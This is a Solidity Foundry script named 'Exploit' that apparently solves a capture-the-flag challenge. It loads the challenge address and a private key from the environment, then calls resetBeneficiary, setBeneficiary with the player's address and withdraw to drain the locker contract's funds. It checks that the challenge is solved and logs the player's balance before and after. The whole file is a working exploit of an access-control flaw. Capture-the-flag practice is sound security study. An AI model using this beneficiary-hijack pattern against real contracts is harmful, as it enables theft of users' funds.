// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import { VmSafe } from "forge-std/Vm.sol";
import { Script } from "forge-std/Script.sol";
import { Setup } from "./Setup.sol";
import { Ephemeral } from "./EphemeralLocker.sol";

contract Exploit is Script {
    VmSafe.Wallet public solver;
    Ephemeral public chall;
    Setup public _setup;

    function setUp() public {
        _setup = Setup(payable(vm.envAddress("CHALLENGE_CONTRACT")));
        chall = _setup.ephemeral();
        solver = vm.createWallet(uint256(vm.envBytes32("PRIVATE_KEY")));
    }

    function run() public {
        vm.startBroadcast(solver.privateKey);

        // console.log("player balance: ", solver.addr.balance - 10000 ether + 10 ether);
        console.log("player balance: ", solver.addr.balance);

        chall.resetBeneficiary();
        chall.setBeneficiary(solver.addr);
        chall.withdraw();

        // console.log("player balance: ", solver.addr.balance - 10000 ether + 10 ether);
        console.log("player balance: ", solver.addr.balance);
        require(_setup.isSolved(), "not solved");

        vm.stopBroadcast();
    }
}
